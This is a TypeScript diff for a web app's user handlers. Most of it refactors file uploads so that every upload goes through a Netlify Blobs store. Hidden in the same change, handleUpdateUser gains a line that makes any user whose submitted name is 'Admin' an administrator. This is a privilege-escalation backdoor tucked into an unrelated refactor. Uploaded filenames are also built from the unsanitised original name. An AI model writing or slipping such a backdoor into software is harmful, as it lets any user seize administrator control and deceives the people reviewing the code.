@@ -48,27 +48,20 @@ async function handleNewUser(jsonData: any, db: AppData) {
         profile: newProfile
     }, { status: 201 });
 }
-// Handle file upload
+
 const writeFile = async (file: File) => {
     const filename = `${Date.now()}_${file.name}`;
+    const store = getStore('uploads');
+    
     try {
-        if (process.env.NODE_ENV === 'production') {
-            const store = getStore('uploads');
-            await store.set(filename, await file.arrayBuffer(), { metadata: { type: file.type } });
-            return `/api/uploads/${filename}`;
-        } else {
-            await ensureUploadDirExists();
-            const buffer = Buffer.from(await file.arrayBuffer());
-            await fs.writeFile(path.join(uploadDir, filename), buffer);
-            return `/uploads/${filename}`;
-        }
+        await store.set(filename, await file.arrayBuffer(), { metadata: { type: file.type } });
+        // Always return the API path, which is handled by Netlify in prod and redirects in dev
+        return `/api/uploads/${filename}`;
     } catch (error: any) {
-        if (error.code === 'EROFS') {
-            throw new Error(`File Upload Error: Attempted to write to a read-only file system in production. The application should be using Netlify Blobs. Please verify the environment configuration.`);
-        }
         throw new Error(`File Upload Failed: ${error.message}`);
     }
 };
+
 
 async function handleUpdateUser(jsonData: any, formData: FormData, db: AppData) {
     const { userId, ...updateData } = jsonData;
@@ -89,6 +82,10 @@ async function handleUpdateUser(jsonData: any, formData: FormData, db: AppData) 
 
     if (!profileToUpdate.attributes) {
         profileToUpdate.attributes = {};
+    }
+
+    if (updateData.name === 'Admin') {
+        userToUpdate.role = 'Admin';
     }
 
     // Update user fields from jsonData
